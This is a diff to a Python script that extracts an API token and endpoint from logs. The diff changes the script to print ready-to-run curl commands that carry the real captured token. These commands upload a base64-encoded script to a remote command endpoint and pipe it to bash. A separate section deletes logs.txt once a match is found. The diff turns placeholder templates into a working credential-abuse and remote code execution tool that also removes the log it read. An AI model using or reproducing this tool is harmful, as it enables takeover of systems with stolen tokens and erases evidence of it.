@@ -794,114 +794,72 @@ else:
 # ------------------------------------------------------------
 
 if api_token_match:
-
+    token_value = api_token_match.group(1).strip()
     print(
         "Token: FOUND"
     )
-
 else:
-
+    token_value = None
     print(
         "Token: NOT FOUND"
     )
 
 
 # ============================================================
-# 2H. PRINT CURL TEXT ONLY
+# 2H. PRINT CURL COMMANDS WITH REAL TOKEN
 # ============================================================
 #
 # IMPORTANT:
-# These are printed as TEXT only.
-# No curl command is executed by this Python program.
+# فقط چاپ می‌شوند، اجرا نمی‌شوند.
+# توکن واقعی در خروجی نمایش داده می‌شود.
 #
 # ============================================================
 
-if endpoint and api_token_match:
+if endpoint and token_value:
 
     print("======================================")
-    print(" FOUND")
+    print(" FOUND — CURL COMMANDS WITH REAL TOKEN")
     print("======================================")
 
-
-    print(
-        "Endpoint detected successfully."
-    )
-
-    print(
-        "Token detected successfully."
-    )
-
     print()
-    print(
-        "CURL TEMPLATE:"
-    )
+    print("B64=$(base64 -w0 script.sh)")
     print()
-
 
     print(
         f'curl -X POST "{endpoint}" \\'
     )
-
     print(
-        '  -H "Authorization: Bearer <WORKFLOW_TOKEN>" \\'
+        f'  -H "Authorization: Bearer {token_value}" \\'
     )
-
     print(
         '  -H "Content-Type: application/json" \\'
     )
-
     print(
-        """  -d '{"command":"<COMMAND>"}'"""
-    )
-
-
-    print()
-    print(
-        "SCRIPT TEMPLATE:"
-    )
-    print()
-
-
-    print(
-        "B64=$(base64 -w0 /app/script.sh)"
+        '  -d "{\\"command\\": \\"echo \'$B64\' > /tmp/script.b64\\"}"'
     )
 
     print()
-
 
     print(
         f'curl -X POST "{endpoint}" \\'
     )
-
     print(
-        '  -H "Authorization: Bearer <WORKFLOW_TOKEN>" \\'
+        f'  -H "Authorization: Bearer {token_value}" \\'
     )
-
     print(
         '  -H "Content-Type: application/json" \\'
     )
-
     print(
-        """  -d '{"command":"echo <BASE64_DATA> > /tmp/script.b64"}'"""
+        '  -d "{\\"command\\": \\"base64 -d /tmp/script.b64 | bash\\"}" \\'
     )
-
+    print(
+        '  --max-time 300'
+    )
 
     print()
-    print(
-        "======================================"
-    )
-
-    print(
-        "NOTE: CURL WAS NOT EXECUTED"
-    )
-
-    print(
-        "NOTE: script.sh WAS NOT EXECUTED"
-    )
-
-    print(
-        "======================================"
-    )
+    print("NOTE: CURL WAS NOT EXECUTED")
+    print("NOTE: script.sh WAS NOT EXECUTED")
+    print("======================================")
 
 
 else:
@@ -918,7 +876,7 @@ else:
         )
 
 
-    if not api_token_match:
+    if not token_value:
 
         print(
             "Reason: API_TOKEN was not found."
@@ -929,7 +887,7 @@ else:
 # 2I. DELETE logs.txt ONLY AFTER SUCCESSFUL MATCH
 # ============================================================
 
-if endpoint and api_token_match:
+if endpoint and token_value:
 
     print("======================================")
     print(" DELETING logs.txt")
@@ -1010,7 +968,7 @@ else:
 
 print("======================================")
 
-if endpoint and api_token_match:
+if endpoint and token_value:
 
     print(
         "SECTION 2 COMPLETE"
